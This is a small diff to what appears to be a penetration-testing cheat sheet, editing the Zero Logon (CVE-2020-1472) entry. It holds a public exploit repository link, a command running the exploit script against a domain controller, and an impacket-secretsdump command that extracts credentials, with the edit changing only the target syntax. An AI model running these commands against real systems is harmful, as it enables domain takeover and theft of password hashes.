@@ -221,6 +221,6 @@ CVE-2020-1472 : Zero Logon
 ```markdown
 https://github.com/dirkjanm/CVE-2020-1472
 python3 cve-2020-1472-exploit.py HOSTNAME IP
-impacket-secretsdump './HOSTNAME$@IP'
+impacket-secretsdump 'HOSTNAME$@IP'
 ```
 
